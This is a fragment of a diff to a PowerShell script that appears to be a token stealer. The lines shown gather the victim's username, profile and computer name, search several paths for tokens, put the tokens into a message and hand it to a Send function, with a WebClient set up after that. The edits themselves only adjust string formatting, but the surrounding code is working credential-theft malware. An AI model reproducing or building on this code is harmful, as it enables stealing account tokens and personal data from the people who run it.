@@ -40,7 +40,7 @@ function GetInfo {
 **USERNAME**: $env:USERNAME 
 **USERPROFILE**: $env:USERPROFILE
 **COMPUTER NAME**: $env:COMPUTERNAME
-    "
+"
 }
 
 [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
@@ -68,7 +68,7 @@ $paths = @(
 )
 
 $info = GetInfo
-$message = $info + '```Tokens:' + "`n"
+$message = $info + '```Tokens: ' + "`n"
 
 foreach ($path in $paths) {
     if (Test-Path -Path $path) {
@@ -76,7 +76,7 @@ foreach ($path in $paths) {
         $message += $tokens + "`n"
     }
 }
-$message += '```'
+$message += '``` $tokens XXXXXXXXX'
 Send -content $message
 
 $wc = New-Object System.Net.WebClient
